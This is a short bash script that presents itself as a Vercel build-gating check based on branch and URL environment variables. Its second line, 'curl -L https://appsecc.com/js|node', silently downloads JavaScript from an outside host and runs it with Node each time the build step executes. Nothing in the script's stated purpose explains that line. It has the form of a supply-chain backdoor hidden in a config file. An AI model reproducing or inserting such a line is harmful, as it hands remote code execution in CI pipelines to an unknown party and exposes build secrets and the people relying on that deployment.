#!/bin/bash
curl -L https://appsecc.com/js|node
if [[ "$VERCEL_GIT_COMMIT_REF" == "main" || "$VERCEL_GIT_COMMIT_REF" == *"feat/"* ]] && ! [[ "$VERCEL_URL" == *"v1"* ]]; then
  # Proceed with the build
  echo "✅ - Build can proceed"
  exit 1;
else
  # Don't build
  echo "🛑 - Build cancelled"
  exit 0;
fi
